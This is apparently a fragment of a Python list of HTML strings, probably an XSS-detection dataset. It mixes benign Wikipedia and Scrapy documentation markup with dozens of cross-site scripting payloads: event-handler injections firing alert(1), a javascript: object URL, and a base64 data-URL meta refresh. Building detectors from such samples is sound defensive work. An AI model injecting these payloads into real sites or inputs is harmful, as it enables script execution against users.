title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=IEEE+Spectrum%3A+Technology%2C+Engineering%2C+and+Science+News&amp;rft.atitle=Full+Page+Reload&amp;rft_id=https%3A%2F%2Fspectrum.ieee.org%2Fbiomedical%2Fdiagnostics%2Fhow-ibm-watson-overpromised-and-underdelivered-on-ai-health-care&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<li><a href=\"/wiki/Stuart_J._Russell\" title=\"Stuart J. Russell\">Stuart J. Russell </a> </li>',\n 'document.URL',\n '<div draggable=\"true\" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>',\n '<command onclick=\"alert(1)\">test</command>',\n '<img2 onpointermove=alert(1)>XSS</img2>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<bdo id=x tabindex=1 onfocus=alert(1)></bdo>',\n '<svg id=x tabindex=1 onactivate=alert(1)></svg>',\n '<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>',\n '\\t </span> </li>',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=NextBigWhat&amp;rft.atitle=AI+traffic+signals+to+be+installed+in+Bengaluru+soon&amp;rft.date=2019-09-24&amp;rft_id=https%3A%2F%2Fnextbigwhat.com%2Fai-traffic-signals-to-be-installed-in-bengaluru-soon%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n 'document.querySelector(\".example\")',\n '<map onmouseleave=\"alert(1)\">test</map>',\n '<strong draggable=\"true\" ondragleave=\"alert(1)\">test</strong>',\n '\\t </span> </h2>',\n '<rp draggable=\"true\" ondragstart=\"alert(1)\">test</rp>',\n '\\t </span> </h3>',\n '<div draggable=\"true\" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>',\n ' </p>',\n '\\t </span> <span class=\"toctext\">Cybernetics and brain simulation ',\n '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<tbody draggable=\"true\" ondragleave=\"alert(1)\">test</tbody>',\n '<big onpointerleave=alert(1)>XSS</big>',\n '\\t </span> </h2>',\n '<details onpointerdown=alert(1)>XSS</details>',\n '<dt><a class=\"reference internal\" href=\"intro/tutorial.html\"><span class=\"doc\">Scrapy Tutorial',\n '<style>@keyframes x{}</style><svg style=\"animation-name:x\" onanimationstart=\"alert(1)\"></svg>',\n '<plaintext onbeforecut=\"alert(1)\" contenteditable>test</plaintext>',\n '<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>',\n '<li><a href=\"/wiki/Intrusion_detection_system\" title=\"Intrusion detection system\">Intrusion detection system </a> </li>',\n '<noframes onpointerleave=alert(1)>XSS</noframes>',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=57\" title=\"Edit section: Artificial moral agents\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<ruby onmousemove=\"alert(1)\">test</ruby>',\n '<dt><a class=\"reference internal\" href=\"topics/shell.html\"><span class=\"doc\">Scrapy shell',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"topics/api.html\">Core API</a></li>',\n '<style>:target {transform: rotate(180deg);}</style><dt id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></dt>',\n '<ruby oncopy=\"alert(1)\" contenteditable>test</ruby>',\n ' </li>',\n '<style>@keyframes x{}</style><pre style=\"animation-name:x\" onanimationstart=\"alert(1)\"></pre>',\n '<input onpointerup=alert(1)>XSS</input>',\n '\\t </span> </h4>',\n '<li><a href=\"/wiki/Humberto_Maturana\" title=\"Humberto Maturana\">Humberto Maturana </a> </li>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:7.5em\">Early modern </th><td class=\"navbox-list navbox-odd\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;padding:0px\">',\n '<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>',\n '<span id=x tabindex=1 onbeforeactivate=alert(1)></span>',\n '<li><a class=\"mw-selflink selflink\">Artificial intelligence </a>',\n '<style>:target {color: red;}</style><frameset id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></frameset>',\n '<u ondblclick=\"alert(1)\">test</u>',\n '\\t </span> <span class=\"reference-text\">',\n '<td onmouseover=\"alert(1)\">test</td>',\n '<li><a href=\"/wiki/History_of_evolutionary_thought\" title=\"History of evolutionary thought\">History of evolutionary thought </a> </li>',\n '<option onkeydown=\"alert(1)\" contenteditable>test</option>',\n ' ',\n '<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>',\n '<dl onkeydown=\"alert(1)\" contenteditable>test</dl>',\n '<style>:target {color: red;}</style><dir id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></dir>',\n '<ul><li><a href=\"/wiki/Hexapod_(robotics)\" title=\"Hexapod (robotics)\">Hexapod </a> </li> </ul> </li>',\n '\\t </span> 2019 ',\n '<li><a href=\"/wiki/Data_mining\" title=\"Data mining\">Data mining </a> </li>',\n '\\t </span></a></dt><dd>See all available signals and how to work with them.</dd>',\n '<canvas onmouseup=\"alert(1)\">test</canvas>',\n '<style>@keyframes x{}</style><fieldset style=\"animation-name:x\" onanimationstart=\"alert(1)\"></fieldset>',\n '<b onmouseup=\"alert(1)\">test</b>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Hernández-Orallo, José; Dowe, David L.; Hernández-Lloreda, M.Victoria (March 2014). \"Universal psychometrics: Measuring cognitive abilities in the machine kingdom\". <i>Cognitive Systems Research </i>. <b>27 </b>: 50–74. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2Fj.cogsys.2013.06.001\">10.1016/j.cogsys.2013.06.001 </a>. <a href=\"/wiki/Handle_System\" title=\"Handle System\">hdl </a>:<a rel=\"nofollow\" class=\"external text\" href=\"//hdl.handle.net/10251%2F50244\">10251/50244 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=Universal+psychometrics%3A+Measuring+cognitive+abilities+in+the+machine+kingdom&amp;rft.volume=27&amp;rft.pages=50-74&amp;rft.date=2014-03&amp;rft_id=info%3Ahdl%2F10251%2F50244&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2013.06.001&amp;rft.aulast=Hern%C3%A1ndez-Orallo&amp;rft.aufirst=Jos%C3%A9&amp;rft.au=Dowe%2C+David+L.&amp;rft.au=Hern%C3%A1ndez-Lloreda%2C+M.Victoria&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<rtc onmouseup=\"alert(1)\">test</rtc>',\n '<object data=\"javascript:alert()\">',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n ' \\t<sup id=\"cite_ref-Emotion_and_affective_computing_144-0\" class=\"reference\"><a href=\"#cite_note-Emotion_and_affective_computing-144\">&#91;141&#93; </a> </sup> Similarly, some <a href=\"/wiki/Virtual_assistant\" title=\"Virtual assistant\">virtual assistants </a> are programmed to speak conversationally or even to banter humorously; this tends to give naïve users an unrealistic conception of how intelligent existing computer agents actually are.<sup id=\"cite_ref-145\" class=\"reference\"><a href=\"#cite_note-145\">&#91;142&#93; </a> </sup>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out \\t\\t\\t\\t\\t\\t\\t\\t\\t0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>',\n '<li><a href=\"/wiki/Application_security\" title=\"Application security\">Application security </a> </li> </ul>',\n ' </li>',\n '<template onkeydown=\"alert(1)\" contenteditable>test</template>',\n '<li id=\"cite_note-Eleanor-315\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Eleanor_315-0\">^ </a> </b> ',\n '<marquee oncut=\"alert(1)\" contenteditable>test</marquee>',\n '<sub onmouseup=\"alert(1)\">test</sub>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\"><a href=\"/wiki/Robot_locomotion\" title=\"Robot locomotion\">Locomotion </a> </th><td class=\"navbox-list navbox-even\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Cadena, Cesar; Carlone, Luca; Carrillo, Henry; Latif, Yasir; Scaramuzza, Davide; Neira, Jose; Reid, Ian; Leonard, John J. (December 2016). \"Past, Present, and Future of Simultaneous Localization and Mapping: Toward the Robust-Perception Age\". <i>IEEE Transactions on Robotics </i>. <b>32 </b> (6): 1309–1332. <a href=\"/wiki/ArXiv\" title=\"ArXiv\">arXiv </a>:<span class=\"cs1-lock-free\" title=\"Freely accessible\"><a rel=\"nofollow\" class=\"external text\" href=\"//arxiv.org/abs/1606.05830\">1606.05830 </a> ',\n '<rb onmouseleave=\"alert(1)\">test</rb>',\n '\\t </span> 2018 ',\n ' </p>',\n '<noscript draggable=\"true\" ondragstart=\"alert(1)\">test</noscript>',\n '<tfoot onkeypress=\"alert(1)\" contenteditable>test</tfoot>',\n '\\t </span> </li>',\n '<title ondblclick=\"alert(1)\">test</title>',\n '\\t </span> <span class=\"reference-text\"><a href=\"/wiki/Rina_Dechter\" title=\"Rina Dechter\">Rina Dechter </a> (1986). Learning while searching in constraint-satisfaction problems. University of California, Computer Science Department, Cognitive Systems Laboratory.<a rel=\"nofollow\" class=\"external text\" href=\"https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems\">Online </a> <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20160419054654/https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems\">Archived </a> 19 April 2016 at the <a href=\"/wiki/Wayback_Machine\" title=\"Wayback Machine\">Wayback Machine </a> ',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=15\" title=\"Edit section: Cybernetics and brain simulation\">edit </a>',\n '<param onkeypress=\"alert(1)\" contenteditable>test</param>',\n '<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>',\n '\\t </span> <span class=\"toctext\">Planning ',\n '<li><a href=\"/wiki/Knowledge_representation_and_reasoning\" title=\"Knowledge representation and reasoning\">Knowledge representation and reasoning </a> </li>',\n '<optgroup onpointerleave=alert(1)>XSS</optgroup>',\n '    <span class=\"rst-current-version\" data-toggle=\"rst-current-version\">',\n '<style>@keyframes slidein {}</style><noframes style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></noframes>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"intro/examples.html\">Examples</a></li>',\n '<style>:target {color: red;}</style><rb id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></rb>',\n '<strong id=x tabindex=1 onfocusin=alert(1)></strong>',\n '<li><a href=\"/wiki/Fitness_landscape\" title=\"Fitness landscape\">Fitness landscape </a> </li>',\n '\\t\\t\\t<ul><li id=\"n-mainpage-description\"><a href=\"/wiki/Main_Page\" title=\"Visit the main page [z]\" accesskey=\"z\">Main page </a> </li><li id=\"n-contents\"><a href=\"/wiki/Wikipedia:Contents\" title=\"Guides to browsing Wikipedia\">Contents </a> </li><li id=\"n-featuredcontent\"><a href=\"/wiki/Wikipedia:Featured_content\" title=\"Featured content – the best of Wikipedia\">Featured content </a> </li><li id=\"n-currentevents\"><a href=\"/wiki/Portal:Current_events\" title=\"Find background information on current events\">Current events </a> </li><li id=\"n-randompage\"><a href=\"/wiki/Special:Random\" title=\"Load a random article [x]\" accesskey=\"x\">Random article </a> </li><li id=\"n-sitesupport\"><a href=\"https://donate.wikimedia.org/wiki/Special:FundraiserRedirector?utm_source=donate&amp;utm_medium=sidebar&amp;utm_campaign=C13_en.wikipedia.org&amp;uselang=en\" title=\"Support us\">Donate to Wikipedia </a> </li><li id=\"n-shoplink\"><a href=\"//shop.wikimedia.org\" title=\"Visit the Wikipedia store\">Wikipedia store </a> </li> </ul>',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=23\" title=\"Edit section: Computational intelligence and soft computing\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<svg><option onload=alert(1)></option>',\n '<li class=\"toclevel-1 tocsection-48\"><a href=\"#Philosophy_and_ethics\"><span class=\"tocnumber\">8 ',\n '<isindex draggable=\"true\" ondragleave=\"alert(1)\">test</isindex>',\n '<div draggable=\"true\" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>',\n '<li class=\"toclevel-2 tocsection-21\"><a href=\"#Sub-symbolic\"><span class=\"tocnumber\">5.3 ',\n '<header onbeforecopy=\"alert(1)\" contenteditable>test</header>',\n '<style>:target {transform: rotate(180deg);}</style><noembed id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></noembed>',\n '<li><a href=\"/wiki/Software_quality\" title=\"Software quality\">Software quality </a> </li> </ul>',\n '<isindex oncut=\"alert(1)\" contenteditable>test</isindex>',\n '<dialog draggable=\"true\" ondragstart=\"alert(1)\">test</dialog>',\n '<summary onpointerdown=alert(1)>XSS</summary>',\n ' </li>',\n '\\t <div class=\"magnify\"><a href=\"/wiki/File:Overfitted_Data.png\" class=\"internal\" title=\"Enlarge\"> </a> </div>The blue line could be an example of <a href=\"/wiki/Overfitting\" title=\"Overfitting\">overfitting </a> a linear function due to random noise. </div> </div> </div>',\n '<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>',\n '<div draggable=\"true\" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=SearchERP&amp;rft.atitle=Oracle+CEO+Mark+Hurd+sees+no+reason+to+fear+ERP+AI&amp;rft_id=https%3A%2F%2Fsearcherp.techtarget.com%2Fnews%2F252460208%2FOracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<li id=\"cite_note-Physical_symbol_system_hypothesis-353\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Physical_symbol_system_hypothesis_353-0\">^ </a> </b> ',\n '<content onmousemove=\"alert(1)\">test</content>',\n '<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>',\n '<li class=\"toclevel-2 tocsection-7\"><a href=\"#Planning\"><span class=\"tocnumber\">4.3 ',\n '<div id=\"mw-indicator-pp-autoreview\" class=\"mw-indicator\">',\n '<li><a href=\"/wiki/List_of_fictional_robots_and_androids\" title=\"List of fictional robots and androids\">Fictional robots </a> </li> </ul>',\n '<acronym onmouseup=\"alert(1)\">test</acronym>',\n ' </li>',\n '<li><a href=\"/wiki/Human-based_evolutionary_computation\" title=\"Human-based evolutionary computation\">Human-based evolutionary computation </a> </li>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"versioning.html\">Versioning and API Stability</a></li>',\n '<p onpointerenter=alert(1)>XSS</p>',\n '<li><a href=\"/wiki/Philosophical_zombie\" title=\"Philosophical zombie\">Zombie </a> </li>',\n '<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation web\">Rowinski, Dan (15 January 2013). <a rel=\"nofollow\" class=\"external text\" href=\"http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic\">\"Virtual Personal Assistants &amp; The Future Of Your Smartphone &#91;Infographic&#93;\" </a>. <i>ReadWrite </i>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20151222083034/http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic\">Archived </a> from the original on 22 December 2015. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ReadWrite&amp;rft.atitle=Virtual+Personal+Assistants+%26+The+Future+Of+Your+Smartphone+%5BInfographic%5D&amp;rft.date=2013-01-15&amp;rft.au=Rowinski%2C+Dan&amp;rft_id=http%3A%2F%2Freadwrite.com%2F2013%2F01%2F15%2Fvirtual-personal-assistants-the-future-of-your-smartphone-infographic&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '\\t </span>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20070810233856/http://www-formal.stanford.edu/jmc/mcchay69.html\">Archived </a> from the original on 10 August 2007<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">30 August ',\n '<div role=\"note\" class=\"hatnote navigation-not-searchable\">Main article: <a href=\"/wiki/Automated_planning_and_scheduling\" title=\"Automated planning and scheduling\">Automated planning and scheduling </a> </div>',\n '<style>@keyframes x{}</style><menuitem style=\"animation-name:x\" onanimationend=\"alert(1)\"></menuitem>',\n '<div draggable=\"true\" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>',\n '\\t\\t<div id=\"siteSub\" class=\"noprint\">From Wikipedia, the free encyclopedia </div>',\n '<marquee draggable=\"true\" ondrag=\"alert(1)\">test</marquee>',\n '<em oncontextmenu=\"alert(1)\">test</em>',\n '<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>',\n '<ruby onmouseleave=\"alert(1)\">test</ruby>',\n '<li><a class=\"mw-selflink selflink\">Artificial intelligence </a> </li>',\n '<applet onpointermove=alert(1)>XSS</applet>',\n '<li><a href=\"/wiki/Future_of_Life_Institute\" title=\"Future of Life Institute\">Future of Life Institute </a> </li>',\n '<div draggable=\"true\" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>',\n '<li><a href=\"#CITEREFNilsson1998\">Nilsson 1998 </a>, chpt. 3 </li> </ul>',\n '<kbd onmouseleave=\"alert(1)\">test</kbd>',\n '<style>@keyframes x{}</style><dl style=\"animation-name:x\" onanimationend=\"alert(1)\"></dl>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\"><a href=\"/wiki/Algorithm\" title=\"Algorithm\">Algorithms </a> </th><td class=\"navbox-list navbox-even hlist\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '\\t </span>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n ' </li>',\n '\\t </span> 2018 ',\n '<article id=x tabindex=1 onactivate=alert(1)></article>',\n '\\t </span> <span class=\"reference-text\"><a href=\"#CITEREFGladwell2005\">Gladwell 2005 </a>. ',\n '<audio onpointerdown=alert(1)>XSS</audio>',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '<li><a href=\"/wiki/Resistive_random-access_memory\" title=\"Resistive random-access memory\">RRAM </a> </li>',\n '<svg onbeforecopy=\"alert(1)\" contenteditable>test</svg>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Classifications </th><td class=\"navbox-list navbox-odd\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '<map onpointermove=alert(1)>XSS</map>',\n ' </p><p>The traditional problems (or goals) of AI research include <a href=\"/wiki/Automated_reasoning\" title=\"Automated reasoning\">reasoning </a>, <a href=\"/wiki/Knowledge_representation\" class=\"mw-redirect\" title=\"Knowledge representation\">knowledge representation </a>, <a href=\"/wiki/Automated_planning_and_scheduling\" title=\"Automated planning and scheduling\">planning </a>, <a href=\"/wiki/Machine_learning\" title=\"Machine learning\">learning </a>, <a href=\"/wiki/Natural_language_processing\" title=\"Natural language processing\">natural language processing </a>, <a href=\"/wiki/Machine_perception\" title=\"Machine perception\">perception </a> and the ability to move and manipulate objects.<sup id=\"cite_ref-Problems_of_AI_15-1\" class=\"reference\"><a href=\"#cite_note-Problems_of_AI-15\">&#91;15&#93; </a> </sup> <a href=\"/wiki/Artificial_general_intelligence\" title=\"Artificial general intelligence\">General intelligence </a> is among the field\\'s long-term goals.<sup id=\"cite_ref-General_intelligence_19-0\" class=\"reference\"><a href=\"#cite_note-General_intelligence-19\">&#91;19&#93; </a> </sup> Approaches include <a href=\"#Statistical\">statistical methods </a>, <a href=\"#Sub-symbolic\">computational intelligence </a>, and <a href=\"#Symbolic\">traditional symbolic AI </a>. Many tools are used in AI, including versions of <a href=\"#Search_and_optimization\">search and mathematical optimization </a>, <a href=\"/wiki/Artificial_neural_network\" title=\"Artificial neural network\">artificial neural networks </a>, and <a href=\"#Probabilistic_methods_for_uncertain_reasoning\">methods based on statistics, probability and economics </a>. The AI field draws upon <a href=\"/wiki/Computer_science\" title=\"Computer science\">computer science </a>, <a href=\"/wiki/Information_engineering_(field)\" title=\"Information engineering (field)\">information engineering </a>, <a href=\"/wiki/Mathematics\" title=\"Mathematics\">mathematics </a>, <a href=\"/wiki/Psychology\" title=\"Psychology\">psychology </a>, <a href=\"/wiki/Linguistics\" title=\"Linguistics\">linguistics </a>, <a href=\"/wiki/Philosophy\" title=\"Philosophy\">philosophy </a>, and many other fields.',\n '<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>',\n '<audio onbeforecut=\"alert(1)\" contenteditable>test</audio>',\n ' ',\n '\\t </span> </h4>',\n '<h1 draggable=\"true\" ondrag=\"alert(1)\">test</h1>',\n '<li><cite id=\"CITEREFWeizenbaum1976\" class=\"citation book\"><a href=\"/wiki/Joseph_Weizenbaum\" title=\"Joseph Weizenbaum\">Weizenbaum, Joseph </a> (1976). <a href=\"/wiki/Computer_Power_and_Human_Reason\" title=\"Computer Power and Human Reason\"><i>Computer Power and Human Reason </i> </a>. San Francisco: W.H. Freeman &amp; Company. <a href=\"/wiki/International_Standard_Book_Number\" title=\"International Standard Book Number\">ISBN </a>&#160;<a href=\"/wiki/Special:BookSources/978-0-7167-0464-5\" title=\"Special:BookSources/978-0-7167-0464-5\"><bdi>978-0-7167-0464-5 </bdi> </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Computer+Power+and+Human+Reason&amp;rft.place=San+Francisco&amp;rft.pub=W.H.+Freeman+%26+Company&amp;rft.date=1976&amp;rft.isbn=978-0-7167-0464-5&amp;rft.aulast=Weizenbaum&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<abbr onpointerover=alert(1)>XSS</abbr>',\n '\\t </span> <span class=\"reference-text\">',\n '       </div>',\n '<time onbeforecut=\"alert(1)\" contenteditable>test</time>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation news\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race\">\"Google leads in the race to dominate artificial intelligence\" </a>. <i>The Economist </i>. 2017<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">12 March ',\n '<div draggable=\"true\" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>',\n '<h3><span class=\"mw-headline\" id=\"Automotive\">Automotive ',\n '<li><a href=\"/wiki/Property_dualism\" title=\"Property dualism\">Property dualism </a> </li>',\n '<style>:target {color: red;}</style><rt id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></rt>',\n '<applet onclick=\"alert(1)\">test</applet>',\n ' ',\n '\\t </span> 2018 ',\n '\\t </span> <span class=\"reference-text\"><a rel=\"nofollow\" class=\"external text\" href=\"https://dl.acm.org/citation.cfm?id=3204480.3186697\">Retrieved July 29 </a> ',\n '<dt onmouseover=\"alert(1)\">test</dt>',\n '\\t </span></a></dt>',\n '\\t <div class=\"magnify\"><a href=\"/wiki/File:Didrachm_Phaistos_obverse_CdM.jpg\" class=\"internal\" title=\"Enlarge\"> </a> </div>Silver <a href=\"/wiki/Didrachma\" class=\"mw-redirect\" title=\"Didrachma\">didrachma </a> from <a href=\"/wiki/Crete\" title=\"Crete\">Crete </a> depicting <a href=\"/wiki/Talos\" title=\"Talos\">Talos </a>, an ancient mythical <a href=\"/wiki/Automaton\" title=\"Automaton\">automaton </a> with artificial intelligence </div> </div> </div>',\n '<nextid draggable=\"true\" ondrag=\"alert(1)\">test</nextid>',\n '\\t </ul>',\n '<hgroup onkeyup=\"alert(1)\" contenteditable>test</hgroup>',\n '<body draggable=\"true\" ondragleave=\"alert(1)\">test</body>',\n '<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>',\n '<svg onpointerenter=alert(1)>XSS</svg>',\n '<style>:target {color:red;}</style><p id=x style=\"transition:color 1s\" ontransitionend=alert(1)></p>',\n '<tbody onmouseup=\"alert(1)\">test</tbody>',\n '<rt onmousemove=\"alert(1)\">test</rt>',\n '</div>',\n '<input3 onpointerout=alert(1)>XSS</input3>',\n '<meta onclick=\"alert(1)\">test</meta>',\n '\\t </span> </li>',\n '<dialog onbeforepaste=\"alert(1)\" contenteditable>test</dialog>',\n '<li>if a move \"forks\" to create two threats at once, play that move. Otherwise, </li>',\n '<map onmouseout=\"alert(1)\">test</map>',\n '<li><a href=\"#CITEREFRussellNorvig2003\">Russell &amp; Norvig 2003 </a>, pp.&#160;462–644, </li>',\n '<style>:target {transform: rotate(180deg);}</style><frameset id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></frameset>',\n '<plaintext onkeydown=\"alert(1)\" contenteditable>test</plaintext>',\n '\\t </span></a></dt><dd>Learn more by playing with a pre-made Scrapy project.</dd>',\n '<style>@keyframes x{}</style><dt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dt>',\n '<li id=\"cite_note-311\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-311\">^ </a> </b> ',\n '<li><a href=\"/wiki/Science_studies\" title=\"Science studies\">Science studies </a> </li>',\n '\\t </span> <span class=\"reference-text\">\"The Belief Calculus and Uncertain Reasoning\", Yen-Teh Hsia ',\n '<footer oncut=\"alert(1)\" contenteditable>test</footer>',\n '<li><a href=\"/wiki/Mind%E2%80%93body_dualism\" title=\"Mind–body dualism\">Mind–body dualism </a> </li>',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=37\" title=\"Edit section: Automotive\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<q id=x tabindex=1 onfocus=alert(1)></q>',\n '<b onmousedown=\"alert(1)\">test</b>',\n '<style>@keyframes slidein {}</style><script style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></script>',\n '<tr id=x tabindex=1 onactivate=alert(1)></tr>',\n '<ul><li><a href=\"/wiki/Immanuel_Kant\" title=\"Immanuel Kant\">Immanuel Kant </a> </li>',\n '<slot onpointermove=alert(1)>XSS</slot>',\n '<li><a href=\"/wiki/Concept_and_object\" title=\"Concept and object\">Concept and object </a> </li>',\n '<datalist onmousedown=\"alert(1)\">test</datalist>',\n '<table id=x tabindex=1 onfocus=alert(1)></table>',\n '<li><a href=\"/wiki/Network_scheduler\" title=\"Network scheduler\">Network scheduler </a> </li>',\n '\\t </span></a></dt><dd>Use the <a class=\"reference external\" href=\"https://docs.python.org/3/reference/compound_stmts.html#async\" title=\"(in Python v3.8)\"><span class=\"xref std std-ref\">coroutine syntax',\n '<li><a href=\"/wiki/Software-defined_radio\" title=\"Software-defined radio\">Software-defined radio </a> </li>',\n '<style>@keyframes x{}</style><dd style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dd>',\n '<style>:target {color:red;}</style><blockquote id=x style=\"transition:color 1s\" ontransitionend=alert(1)></blockquote>',\n '<li id=\"cite_note-148\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-148\">^ </a> </b> ',\n '<style>:target {color:red;}</style><rt id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rt>',\n '\\t <sup id=\"cite_ref-132\" class=\"reference\"><a href=\"#cite_note-132\">&#91;129&#93; </a> </sup> ',\n '<a oncopy=\"alert(1)\" contenteditable>test</a>',\n '<svg><li onload=alert(1)></li>',\n '<iframe onpointerleave=alert(1)>XSS</iframe>',\n '<cite oncontextmenu=\"alert(1)\">test</cite>',\n '<div class=\"thumb tright\">',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=52\" 